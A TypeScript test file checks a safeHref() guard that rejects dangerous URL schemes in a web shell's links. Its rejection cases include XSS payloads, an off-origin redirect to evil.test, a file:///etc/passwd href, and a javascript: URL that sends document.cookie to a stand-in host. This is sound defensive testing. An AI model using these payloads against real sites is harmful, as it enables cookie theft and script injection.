// SPDX-License-Identifier: MPL-2.0
// safeHref() - the scheme guard for any href built from data the shell does not
// control (SUSE assessment 2026-08, S1).
//
// The vulnerability this pins: escape() replaces & < > " ' and NOTHING else, so
// a `javascript:` URL passes through it byte-for-byte and becomes a clickable
// anchor. Escaping is not scheme validation. Every remote-sourced href in the
// shell must clear safeHref() BEFORE it is escaped into the DOM - org/banner.ts
// (inbox CTA), org/chrome.ts (chrome descriptor link) and org/index.ts (the
// control plane's loginPath) all do.
import test from 'node:test';
import assert from 'node:assert/strict';
import { escape, safeHref } from './utils.ts';

test('escape() does not neutralise a javascript: URL - this is why safeHref exists', () => {
  // No quotes, so escape() has nothing to act on - which is exactly how a real
  // payload is written. It survives escaping byte-for-byte and stays executable.
  const payload = 'javascript:fetch(`https://evil.test/${document.cookie}`)';
  assert.equal(escape(payload), payload, 'escape() leaves it byte-identical');
  assert.equal(safeHref(payload), false, 'safeHref is what rejects it');
});

test('safeHref rejects script-bearing and data schemes', () => {
  for (const bad of [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)',
    '\tjavascript:alert(1)',
    'java\nscript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'blob:https://lolly.tools/abc',
    '',
  ]) {
    assert.equal(safeHref(bad), false, `should reject: ${JSON.stringify(bad)}`);
  }
});

test('safeHref allows the four schemes the shell actually links to', () => {
  for (const ok of [
    'https://lolly.tools/verify',
    'http://localhost:5173/',
    'HTTPS://LOLLY.TOOLS/',
    'mailto:hello@lolly.tools',
    '/info/privacy.html',
    '#/profile',
    '#',
  ]) {
    assert.equal(safeHref(ok), true, `should allow: ${JSON.stringify(ok)}`);
  }
});

test('safeHref rejects protocol-relative and backslash authorities', () => {
  // `//evil.test` matches the "starts with /" branch but the browser reads it as
  // protocol-relative and navigates OFF-ORIGIN, so the "a relative path" promise
  // in this guard's contract would quietly have meant "any host". `\` is
  // normalised to `/` in the authority, so the backslash forms are the same bug.
  for (const bad of ['//evil.test/x', '/\\evil.test/x', '\\\\evil.test/x', '\\/evil.test/x']) {
    assert.equal(safeHref(bad), false, `should reject: ${JSON.stringify(bad)}`);
  }
  // A single leading slash is still a real relative path and must keep working.
  assert.equal(safeHref('/info/privacy.html'), true);
});

test('safeHref rejects angle brackets even on an allowed scheme', () => {
  // Belt-and-braces against attribute-breakout attempts reaching the sink at all.
  assert.equal(safeHref('https://x.test/"><script>alert(1)</script>'), false);
  assert.equal(safeHref('/p?<svg onload=alert(1)>'), false);
});

test('escape() covers all five HTML-significant characters', () => {
  assert.equal(escape(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
  assert.equal(escape(null), '');
  assert.equal(escape(undefined), '');
});
